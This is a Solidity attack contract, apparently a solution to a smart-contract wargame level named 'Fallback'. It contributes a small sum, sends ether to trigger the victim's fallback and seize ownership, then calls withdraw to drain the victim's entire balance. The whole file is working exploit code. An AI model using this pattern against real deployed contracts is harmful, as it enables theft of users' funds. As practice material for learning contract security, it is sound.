// SPDX-License-Identifier: MIT
pragma solidity ^0.8.1;

contract Attacker {
    Fallback public victim;
    uint256 public attackAmount;
    uint256 constant public CONTRIBUTION = 0.0001 ether;


    constructor(Fallback _victim) payable {
        victim = _victim;
        attackAmount = msg.value - 1 ether;
    }

    // we're gonna change the ownshership of Fallback and send out the entire balance of it
    function Attack() public {
        victim.contribute{value: CONTRIBUTION}();
        (bool success,) = payable(victim).call{value: attackAmount}("");
        require(success, "failed to send ether");
        // we then call the withdraw fucntion so we receuve etehr and break the contract
        victim.withdraw();
    }

    fallback() external payable {}
    receive() external payable {}

}